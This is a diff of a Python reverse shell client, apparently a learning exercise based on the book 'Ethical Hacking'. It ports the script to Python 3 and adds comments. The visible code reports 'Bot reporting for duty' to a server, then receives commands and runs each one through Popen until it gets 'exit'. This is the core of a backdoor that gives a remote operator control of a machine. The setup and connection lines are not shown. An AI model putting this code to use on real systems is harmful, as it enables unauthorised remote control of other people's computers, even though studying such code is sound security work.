@@ -1,8 +1,8 @@
-#!/usr/bin/env python
-# Scripted to run on python 2.7
+#!/usr/bin/env python3
+# Scripted to run on python3
 
 """
-Description: Reverse Shell script as laid out in the book "Ethical Hacking". Made some adjustments of my own as well.
+Description: Reverse Shell script (client) as laid out in the book "Ethical Hacking". Made some adjustments of my own as well.
 """
 
 import sys
@@ -35,6 +35,7 @@ clientSocket.send('Bot reporting for duty'.encode())
 # Accept/decode any initial messages (commands) from server (max 4064 bytes)
 command = clientSocket.recv(4064).decode()
 
+# Continue receiving commands until server sends 'exit
 while command != 'exit':
     # Execute any received commands and parse output (output,err)
     proc = Popen(command.split(" "), stdout=PIPE, stderr=PIPE)
